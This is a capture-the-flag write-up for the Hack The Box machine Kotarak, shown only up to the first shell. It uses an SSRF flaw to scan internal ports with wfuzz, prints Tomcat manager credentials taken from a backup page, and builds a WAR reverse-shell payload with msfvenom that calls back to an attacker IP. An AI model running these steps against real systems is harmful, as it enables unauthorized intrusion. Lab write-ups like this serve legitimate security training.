---
title: "Hack The Box - Kotarak"
tags: [linux,hard,ssrf,tomcat,ntds.dit,ntlm,secretsdump,wget,cronjob]
categories: HackTheBox-Linux
---


![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/title.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/title.png)

## *NMAP*
This Machine is the Hard level machine so i will prefer the Full Port Scan :- 

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/Untitled%203.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/Untitled%203.png)


## *Enumerating [ SSRF ]*

-> So on port 8080 we have our Tomcat running . On port 60000 we have an webpage that sends an GET request on the url provided :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/Untitled%203.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/Untitled%203.png)

-> If we try to read /etc/passwd the The word **`file`** is filtered which stops us from reading local files. Although we are able to use [localhost](http://localhost) and access this and the tomcat page :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/burp.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/burp.png)

=> Scanning Ports on [localhost](http://localhost) using wfuzz 

**`wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ`**
![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/wfuzz.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/wfuzz.png)

→ [localhost:888](http://localhost:888) has interesting things :

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/back.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/back.png)

→ Taking a look at **backup** option.

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/se.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/se.png)

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/cred.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/cred.png)

We got credentials for tomcat

```
admin : 3@g01PdhB!
```

⇒ Logged in on tomcat manager page. Uploaded a WAR msfvenom shell and popped a shell :

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > shell.war
```
![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/tommm.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/tommm.png)

*Starting out netcat 

![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/image.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/image.png)




